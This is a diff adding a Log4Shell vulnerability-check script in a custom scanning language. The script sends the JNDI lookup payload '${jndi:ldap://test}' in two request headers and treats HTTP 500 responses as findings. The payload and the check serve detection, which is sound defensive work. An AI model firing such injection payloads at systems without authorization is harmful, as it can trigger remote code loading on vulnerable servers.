@@ -1,0 +1,39 @@
+# Log4j (Log4Shell) Vulnerability Check
+# Tests for Log4j RCE vulnerability
+
+if $ARGC < 1 then
+    print "ERROR: Missing target URL"
+    set $stop 1
+else
+    set $target $ARG1
+    set $stop 0
+endif
+
+if $stop == 0 then
+    print "[SCAN] Log4j (Log4Shell) Testing"
+    print "Target: $target"
+    
+    set $log4j_found 0
+    
+    # Test 1: Basic Log4j pattern check
+    GET "$target/"
+    header "User-Agent" "${jndi:ldap://test}"
+    extract status as $test_status
+    if $test_status equals 500 then
+        print "[WARNING] Server error with JNDI pattern"
+        print "  URL: $target/"
+        set $log4j_found $log4j_found + 1
+    endif
+    
+    # Test 2: Check headers
+    GET "$target/api"
+    header "X-Api-Version" "${jndi:ldap://test}"
+    extract status as $api_status
+    if $api_status equals 500 then
+        print "[WARNING] API error with JNDI pattern"
+        print "  URL: $target/api"
+        set $log4j_found $log4j_found + 1
+    endif
+    
+    print "[✓] Completed: 0033_log4j - Found $log4j_found of 2 vulnerabilities tested"
+endif
